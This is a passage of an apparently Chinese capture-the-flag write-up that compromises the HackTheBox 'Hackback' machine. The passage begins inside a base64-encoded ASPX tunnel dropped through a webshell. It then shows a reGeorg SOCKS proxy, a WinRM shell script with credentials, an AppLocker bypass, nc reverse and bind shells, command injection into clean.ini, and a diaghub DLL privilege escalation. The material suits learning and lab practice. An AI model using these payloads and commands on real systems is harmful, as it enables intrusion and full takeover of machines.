HsNCiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7DQogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1UQVJHRVQiKTsNCiAgICAgICAgICAgICAgICAgICAgaW50IHBvcnQgPSBpbnQuUGFyc2UoUmVxdWVzdC5RdWVyeVN0cmluZy5HZXQoInBvcnQiKSk7DQogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOw0KICAgICAgICAgICAgICAgICAgICBJUEFkZHJlc3MgaXAgPSBJUEFkZHJlc3MuUGFyc2UodGFyZ2V0KTsNCiAgICAgICAgICAgICAgICAgICAgU3lzdGVtLk5ldC5JUEVuZFBvaW50IHJlbW90ZUVQID0gbmV3IElQRW5kUG9pbnQoaXAsIHBvcnQpOw0KICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOw0KICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQ29ubmVjdChyZW1vdGVFUCk7DQogICAgICAgICAgICAgICAgICAgIHNlbmRlci5CbG9ja2luZyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsNCiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7DQogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOw0KICAgICAgICAgICAgICAgICAgICBzLkNsb3NlKCk7DQogICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGV4KXsNCg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBTZXNzaW9uLkFiYW5kb24oKTsNCiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmIChjbWQgPT0gIkZPUldBUkQiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGludCBidWZmTGVuID0gUmVxdWVzdC5Db250ZW50TGVuZ3RoOw0KICAgICAgICAgICAgICAgICAgICBieXRlW10gYnVmZiA9IG5ldyBieXRlW2J1ZmZMZW5dOw0KICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7DQogICAgICAgICAgICAgICAgICAgIHdoaWxlICgoYyA9IFJlcXVlc3QuSW5wdXRTdHJlYW0uUmVhZChidWZmLCAwLCBidWZmLkxlbmd0aCkpID4gMCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcy5TZW5kKGJ1ZmYpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBleCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOw0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIkZBSUwiKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmIChjbWQgPT0gIlJFQUQiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIHJlYWRCdWZmID0gbmV3IGJ5dGVbNTEyXTsNCiAgICAgICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlICgoYyA9IHMuUmVjZWl2ZShyZWFkQnVmZikpID4gMCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vQXJyYXkuQ29uc3RyYWluZWRDb3B5KHJlYWRCdWZmLCAwLCBuZXdCdWZmLCAwLCBjKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTeXN0ZW0uQnVmZmVyLkJsb2NrQ29weShyZWFkQnVmZiwgMCwgbmV3QnVmZiwgMCwgYyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7DQogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjYXRjaCAoU29ja2V0RXhjZXB0aW9uIHNvZXgpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7DQogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBSZXNwb25zZS5Xcml0ZSgiR2Vvcmcgc2F5cywgJ0FsbCBzZWVtcyBmaW5lJyIpOw0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIChFeGNlcHRpb24gZXhLYWspDQogICAgew0KICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtRVJST1IiLCBleEthay5NZXNzYWdlKTsNCiAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7DQogICAgfQ0KJT4NCg==";file_put_contents("tunnel.aspx",base64_decode($f));?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafEOIHFuItKcCGialAWU13MEcvCF3FtVPD7MSkibH1ZZUGrMYLUxhVJE2w/640?wx_fmt=png)执行后访问日志，再查看文件可以发现隧道已经建立，说明成功上传代理脚本

```
curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=12345678&session='curl http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafsa0CYTSQicGWYyhJ0P9yYc2YnZ1k9iaicUoiaC7ylabkujk43Rc77cDoDg/640?wx_fmt=png)接下来设置 proxychains 本地代理

```
vim /etc/proxychains4.conf## 配置127.0.0.1 8888
```

使用 reGeorgSocksProxy 开启代理，建立 http 隧道

```
python reGeorgSocksProxy.py -p 8888 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafiaMJAgoB9pGCOLK0ksrj0ZzyfIO71aMgZUyegzMU5YVBclSFhibN86yg/640?wx_fmt=png)通过 WinRm 脚本连接，对 Alamot 的 Ruby 脚本增添上传功能。代码如下

_**原脚本地址：https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb**_

```
require 'winrm-fs'# Author: Alamot# To upload a file type: UPLOAD local_path remote_path# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txtconn = WinRM::Connection.new(  endpoint: 'http://127.0.0.1:5985/wsman',  user: 'simple',  password: 'ZonoProprioZomaro:-(',  :no_ssl_peer_verification => true)file_manager = WinRM::FS::FileManager.new(conn)class String  def tokenize    self.      split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).      select {|s| not s.empty? }.      map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}  endendcommand=""conn.shell(:powershell) do |shell|    until command == "exit\n" do        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi -force $pwd).Name),'> ')")        print(output.output.chomp)        command = gets        if command.start_with?('UPLOAD') then            upload_command = command.tokenize            print("Uploading " + upload_command[1] + " to " + upload_command[2])            file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|                                                                                                                         puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")            end            command = "echo `nOK`n"        end        output = shell.run(command) do |stdout, stderr|            STDOUT.print(stdout)            STDERR.print(stderr)        end    end    puts("Exiting with code #{output.exitcode}")end
```

通过代理执行 winrm_shell.rb

```
proxychains ruby winrm_shell.rb
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafahsGw4ls2nupvS5DCO65EhAZUS4tJYUicw3FrkPTY6CQS2zqd2v50ww/640?wx_fmt=png)成功上线 simple 用户

0x03 权限提升 [hacker]
------------------

### 查看本地环境

**powershell 环境**查看当前语言环境为完整的语言模式

```
$executioncontext.sessionstate.languagemode
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafA3Ayo3fqiauQHM2ib176C1gtWdD9zGibXibUjf0Wft0vnIrMFz5BEwBQuA/640?wx_fmt=png)**AppLocker 绕过**上传 nc.exe 到`\windows\system32\spool\drivers\color`目录下，用于绕过 AppLocker

```
UPLOAD /root/hackthebox/Machines/Hackback/nc.exe C:\Windows\system32\spool\drivers\color\nc.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafkKmCHyfnqGQeLKC44qqwv4PFNeicengIJ2BY1ECEBP5clK9xicfPQxLA/640?wx_fmt=png)在本地开启 nc 监听 443 端口，但是无法回连

```
\Windows\system32\spool\drivers\color\nc.exe 10.10.14.14 443
```

**防火墙限制**查看防火墙是否对出口流量作出了限制

```
cmd /c "netsh advfirewall show currentprofile"
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafWicibkTDB6uayYCnZtdnwINUvRIZXS71qOjMvhMbWoUL1mx0qnic8SlmQ/640?wx_fmt=png)

防火墙默认设置是阻止进出，查看对应的规则

```
cmd /c "netsh advfirewall firewall show rule 
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafVxCqyODPHMW99UJMryIhg4ltzQnvtialXHX0cmypRM5ZHQ4d9W3Sricg/640?wx_fmt=png)显示存在两个规则：ping、web，其中 web 端口包括 80、6666 和 64831，因此我们只能通过这几个端口出口流量

### 查看目录文件

查看根目录，重点关注`util`目录

```
dir c:\
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafjxVv6pnVJ3aBjiazq37RNk7d86gJAdNZMiaax6ksK7z2Js2Cjz9qODrw/640?wx_fmt=png)查看该目录下的所有文件

```
dir c:\util -force
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaf5dCEkO4fFbwLyrAnMNTuOWOVP1dy7ZcJrrXVALicgfdaaan3c6PwZtw/640?wx_fmt=png)重点关注隐藏文件夹`scripts`

```
dir c:\util\scripts
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafA27ibuKCqSV15DsSrES2Y1ezk8nhxp2S28IgK8CtIqYYqrme8RsrqrQ/640?wx_fmt=png)发现 log.txt 和 batch.log 今天还在更新，而 dellog.ps1 是一个脚本。我们只能查看 log.txt，而 batch.log 和 dellog.ps1 没有权限查看![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaftHpUKKur03zxYo7nGDUYia5eFJTYNKpzOe9wb7vQ4OTtqZbZZ3c71eQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafTn6u4XJdnlDrzYKBzhHCpibDVbjqcZHxnaWq13iaffgmibKrOiaucwKOFQ/640?wx_fmt=png)

### 命令注入完成 nc 上线

检查文件 clean.ini，猜测是 dellog.ps1 的参数文件![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafficwviaTeSVyD1kmdob3AA3C1P24eWPqKAibibelvV2XWhTpbq9LgoLxpg/640?wx_fmt=png) dellog.ps1 执行时会把 clean.ini 中的内容作为参数执行，因此这里存在命令注入漏洞。我们可以编辑 clean.ini，向其中写入命令

```
echo [Main] > C:\util\scripts\clean.iniecho Lifetime=100 >> C:\util\scripts\clean.iniecho "LogFile=c:\util\scripts\log.txt & cmd.exe /c c:\\Windows\system32\spool\drivers\color\nc.exe -lvp 2222 -e cmd.exe" >> C:\util\scripts\clean.iniecho "Directory=c:\inetpub\logs\logfiles" >> C:\util\scripts\clean.ini
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaf9bVJRysdSDbiciaySjT5hyPEkm08zJSo1wdJeVfpDhZGGj1QFdFaAPWA/640?wx_fmt=png)成功写入命令，过五分钟左右监听器会启动，通过代理 nc 可连接目标

```
proxychains nc 10.10.10.128 2222
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafooMCicRicT94hbb2loQs0McpfYzhib9zRmtULKdXUKqDB3ggZlvObXmrA/640?wx_fmt=png)成功获取 shell

### 读取 user.txt

```
dir c:\Users\hacker\Desktoptype c:\Users\hacker\Desktop\user.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafdN1WyicbuM7gLyR4vq4A5ZYXN0ziaL7KpYuW23D14DOpibmF6IG2IMYgw/640?wx_fmt=png)成功拿到第一个 flag

0x04 权限提升 [system]
------------------

### 分析 UserLogger 服务

通过枚举，可以发现存在一个不认识的服务`UserLogger`，在注册表查看该服务

```
reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\userlogger
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafldltpiavVm6IiaBr4RjSGpTRDqccYtkfbESLZq0Ioo4rKDMMeAagA7gQ/640?wx_fmt=png)启动服务`UserLogger`，指定目录为`c:\mac`

```
sc start userlogger c:\mac
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafq7t1cmPGMAeLamWyo8Tayg59vQw3fsvV069rIVYBsXKFibWggPPibFvA/640?wx_fmt=png)查看根目录发现 mac.log 已经生成，查看该日志文件![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafhl2h1dAxOcobtibErszuicMK54xoeQRk3NDibgqf8ZcICSRLD0icltBWuA/640?wx_fmt=png)查看文件权限，为 everyone

```
cacls C:\mac.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafpib0iaWAfJFLTibVeTuV9q9LtiaiaibnWV5a3Ur4vorTQK6wNhXqYlCIfVCQ/640?wx_fmt=png)经过分析这个服务可以将输入路径的最后一个文件名拼接上. log，同时修改文件的权限。由于 windows 的文件名不接受:，可以在文件名最后加上: 进行截断，也就是当它读取. log 的所有内容时，: 将被删除，新权限将被应用到文件名上。

### NTFS 数据流读取 root.txt

那么可以尝试读取 root.txt。首先进入 administrator 目录

```
sc start userlogger "c:\users\administrator:"icacls c:\users\administratorcd c:\users\administrator
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafNKqicrq6TDpj0oavHibkoyaMib6eNYHCic7B8tYrO5jf5tfNBT3kW836gQ/640?wx_fmt=png)成功进入，接下来读取 root.txt

```
sc stop userloggersc start userlogger "c:\users\administrator\desktop\root.txt:"
```

如果在 cmd 下直接读取是读取不到的，需要转换到 powershell 命令窗口才可以看到

```
poweshell
copy c:\users\administrator\desktop\root.txt .
cat root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafqa8jLBnVr4UbfybjR8hynwalyXcyNsR24PkCQdZChjd1tDp1FobUCw/640?wx_fmt=png)该文件不是我们想要的，应该需要使用 ntfs 数据流来进行读取

```
Get-Item c:\users\administrator\root.txt -force -stream *
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafichANmAVBv96pGybQ6Uv7v0ibD8LzlRQp95D7SZ1K3wyrfpDa8G35h4g/640?wx_fmt=png)

```
cat c:\users\administrator\root.txt:flag.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafLU0sNUlDq7atlnVn45PVcNyJb2ZX15LZx6ZuWMxicBcqYa8SvQuqATQ/640?wx_fmt=png)成功获取第二个 flag

### 恶意 dll 上线 system

在 2018 年 4 月，Google 的`Project Zero`发表文章，谈论 diaghub 服务可以指示 system32 以 system 身份从内部加载 dll，那么当它加载时，不会检查文件的扩展名，所以只要写入一个 dll 到 system32 中，就可以要求 diaghub 加载它。鉴于此，我可以使用与 system 相同的路径，通过 userlogger 写入 system32，将恶意 dll 放入 log 文件中，然后调用 diaghub 来加载它。

_**exp 源地址：https://github.com/decoder-it/diaghub_exploit**_

开始制作恶意 dll 文件，在此需要使用到 Visual Stdio，将上述文件夹打开并生成，选择 JSK 为 10.0.17736.0![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafaKjaIv4l403MPg6hjLO4qBaAHeIictFicWQEr4kV9iaq810KXK4jnamfw/640?wx_fmt=png) 成功生成项目![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaffwrnHp6Cibiaw42KvanmiaTwZAloF5qhLuHW8FU7tiaxJtxZ3cRQicmqOVw/640?wx_fmt=png)在 shell 中将以下代码写入 mac.bat 中

```
C:\Windows\system32\spool\drivers\color\nc.exe -l -p 5555 -e cmd.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaf10ue3H0SgEVsCgYicU7bAy0cj2zQ5g0wMfJh0ul6H2CiaIdqhd2JeBXw/640?wx_fmt=png)在 FakeDLL.cpp 中修改命令代码为本地执行 bat 脚本路径![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafbod47ors3VacueGHLVvamMAgRc4Rbiba77M3IhR3m2guOMVZpDezztA/640?wx_fmt=png)点击重新生成即可![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafuBAiacvEwv1A9bVecO6fXMibAvX9u5trUXzg0QvVE3Pmbbh7wib7EWzsA/640?wx_fmt=png)同理在 diaghub_exploit.cpp 中修改执行的目录环境，用于绕过 AppLocker 应用策略![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafjawVR4zC3OvsBvklcefnQAofO7ZV73SwDlvqJK6Ja1x7QR4rh29JKw/640?wx_fmt=png)点击重新生成，然后在目录中找到 diaghub_exploit.exe 和 FakeDll.dll![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafD1ZibMX3g8RZMjvV5W9o3OEHE4ImNzPYrmUpAQQMVn9a66k14qdFdXA/640?wx_fmt=png) 把它们上传到`C:\Windows\system32\spool\drivers\color\`目录下

```
UPLOAD diaghub_exploit.exe C:\Windows\system32\spool\drivers\color\mac.exe
UPLOAD FakeDll.dll C:\Windows\system32\spool\drivers\color\FakeDll.dll
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafTBmVUaMOuvxLlaj0KR4s9sLWnrXIRyrjH2ZlnC5goPxFnWPKtNdPicg/640?wx_fmt=png)进入 powershell 命令行开启 UserLogger，并将 FakeDll.dll 拷贝到`C:\windows\system32\`目录下

```
cmd /c  "sc.exe start userlogger C:\windows\system32\mac"copy C:\Windows\system32\spool\drivers\color\FakeDll.dll C:\windows\system32\mac.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafgfAauKhbCuqneGoicOBtibYRfIC8jyFpWpwbf2v3ictUQTPibHPp0yxgSw/640?wx_fmt=png)但是显示进入失败，说明恶意 dll 文件未上传到`C:\windows\system32\`目录下，查看 mac.log

```
ls c:\windows\system32 | findstr mac
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafLm4dEd351UhX91yjkwxcbic1vpVUQ6wqwZzVo4IWiaPMos2APf3OtZow/640?wx_fmt=png)在其中未直接生成 log 文件，观看 appsec 视频说是需要使用`Invoke-Expression`来完成写入

```
Invoke-Expression "sc.exe start UserLogger C:\windows\system32\mac"
```

但是我还是没写入到`C:\windows\system32\`目录中，原来是 nc 的运行位数搞错了，需要上传 64 位的 nc

```
UPLOAD /root/hackthebox/Machines/Hackback/nc64.exe C:\Windows\system32\spool\drivers\color\nc.exe
```

再次执行可以看到 mac.log![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafJh7InhrVlEOV3ArUaLdWV1H5yvClTUAKC4TrFTONzHpSKtgXWTrY3g/640?wx_fmt=png) 接下来就是将恶意 dll 程序复制到`C:\windows\system32\`目录并重命名为 mac.log，然后执行运行 exp 程序即可

```
copy C:\Windows\system32\spool\drivers\color\FakeDll.dll C:\windows\system32\mac.log
C:\Windows\system32\spool\drivers\color\mac.exe mac.log
```

查看本地端口开放情况，如果开放了 5555 端口那么说明 exp 利用成功![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaf2IbkiceMI14beiaKRhBOhMia0m5eeemBYIWW5f753pC5h8WicIic4TjfPYw/640?wx_fmt=png)

最后通过代理连接可获取到 system

```
proxychains nc 10.10.10.128 5555
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafecbSHibCRyHYfv1ibQ5uYe9ibE9MEYHJOEgLBlAibuycmEyT8bP9rib1QJg/640?wx_fmt=png)通过 ntfs 数据流获取 flag

```
dir c:\users\administrator\Desktop /a /rcd c:\users\administrator\Desktoppowershell -c Get-Content -stream root.txt:flag.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafRKQ0aic22xJ2JTI3yKvFwjl7OR1VHhlzBGygZKvocddFRYyTyorLB1w/640?wx_fmt=png)